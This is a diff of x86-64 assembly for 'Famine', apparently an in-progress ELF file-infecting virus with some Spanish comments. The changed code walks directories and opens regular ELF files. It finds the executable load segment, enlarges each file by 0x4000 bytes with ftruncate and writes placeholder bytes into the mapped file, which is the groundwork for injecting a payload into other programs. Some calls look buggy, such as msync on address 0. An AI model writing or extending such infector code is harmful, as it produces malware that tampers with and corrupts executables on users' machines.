@@ -15,6 +15,9 @@ section .text
     mov rbp, rsp
     sub rbp, Famine_size            ; allocate Famine struct on stack
 
+    xor rax, rax
+    mov VAR(Famine.truncate_flag), rax
+
     ;load dirs
     lea rdi, [dirs]
 
@@ -74,7 +77,7 @@ section .text
             ; check if the file is DT_REG
             cmp byte [rdi + dirent.d_type], DT_REG
             jne .check_for_files_in_dirents
-        
+
             add rdi, dirent.d_name
 
             .openat:
@@ -108,7 +111,9 @@ section .text
                 cmp eax, S_IFREG            ; reg file type
                 jne .close_file
                 mov rax, [rsp + 48]
-                mov VAR(Famine.file_original_len), rax
+                mov dword VAR(Famine.file_original_len), eax
+                TRACE_TEXT hello, 11
+
                 jmp .check_ehdr
 
                 .end_fstat:
@@ -116,6 +121,7 @@ section .text
                     jmp .close_file
 
             .check_ehdr:
+                add rsp, 144                    ; deallocate fstat struct from stack
 
                 ; read(fd_file, rsi, 64);
                 mov rdi, VAR(Famine.fd_file)
@@ -134,17 +140,23 @@ section .text
                 cmp byte [rsp + 5], 1     ; EI_DATA = little endian
                 jne .check_ehdr_error
 
-                add rsp, 64
+                add rsp, Elf64_Ehdr_size
                 jmp .mmap
 
                 .check_ehdr_error:
-                    add rsp, 64
+                    add rsp, Elf64_Ehdr_size
                     jmp .close_file
 
             .mmap:
+
+                ; mmap size : original_len + 0x4000. After ftruncate, writes are OK
+                xor rax, rax
+                mov eax, dword VAR(Famine.file_original_len)
+                add rax, 0x4000
+
                 ; mmap(NULL, file_original_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd_file, 0)
                 mov rdi, 0x0
-                mov rsi, VAR(Famine.file_original_len)
+                mov rsi, rax
                 mov rdx, PROT_READ | PROT_WRITE
                 mov r10, MAP_SHARED
                 mov r8, VAR(Famine.fd_file)
@@ -153,7 +165,7 @@ section .text
                 syscall
                 test rax, rax
                 jle .close_file
-                mov VAR(Famine.mmap_pointer), rax   ; save mmap_pointer
+                mov VAR(Famine.mmap_ptr), rax   ; save mmap_ptr
 
             .infect:
 
@@ -169,27 +181,61 @@ section .text
                 ;rbx = phdr_pointer
                 .loop_phdr:
                     cmp rax, 0
-                    jle .end_loop_phdr
+                    jle .close_file
                     ; lo que sea de rbx
 
                     cmp dword [rbx], 0x1
                     jne .next_phdr
                     cmp dword [rbx + 4], 0x5 ; (1 << 2) | (1 << 0)
                     jne .next_phdr
-                    TRACE_TEXT hello, 11
-                    jmp .end_loop_phdr
+                    jmp .process_phdr
 
                 .next_phdr:
                     dec rax
                     add rbx, Elf64_Phdr_size ; siguiente nodo del phdr
                     jmp .loop_phdr
 
+                .process_phdr:
+                    ; ftruncate(fd_file, file_original_len + 0x4000)
+                    mov rdi, VAR(Famine.fd_file)
+                    xor rax, rax
+                    mov eax, dword VAR(Famine.file_original_len)
+                    add rax, 0x4000
+                    mov r13, rax
+                    mov rsi, rax
+                    mov rax, SC_FTRUNCATE
+                    syscall
 
-                .end_loop_phdr:
+                    ; mmap_ptr: puntero al mmap (ya de tamaño file_original_len + 0x4000)
+                    ; rbx = mmap_ptr
+                    mov rax, VAR(Famine.mmap_ptr)
+
+                    ; offset penúltimo byte
+                    mov ecx, dword VAR(Famine.file_original_len)
+                    add rcx, 0x4000
+                    dec rcx               ; penúltimo byte
+                    add rax, rcx          ; rax = mmap_ptr + total_size - 1
+
+                    mov byte [rax], 65    ; escribir 'A'
+                    mov byte [rax-1], 65    ; escribir 'A'
+                    mov byte [rax-2], 65    ; escribir 'A'
+
+                    mov rdi, 0
+                    mov rsi, r13
+                    xor rdx, MS_SYNC
+                    mov rax, SC_MSYNC
+                    syscall
+
+                    mov rdi, VAR(Famine.mmap_ptr)
+                    mov rsi, r13
+                    mov rax, SC_UNMAP
+                    syscall
+
                     ; cambiar tamaños
                     ; lo que sea
 
             .close_file:
+                ; TODO llamar al munmap antes de cerrar el fd.
                 mov rdi, VAR(Famine.fd_file)
                 mov rax, SC_CLOSE
                 syscall
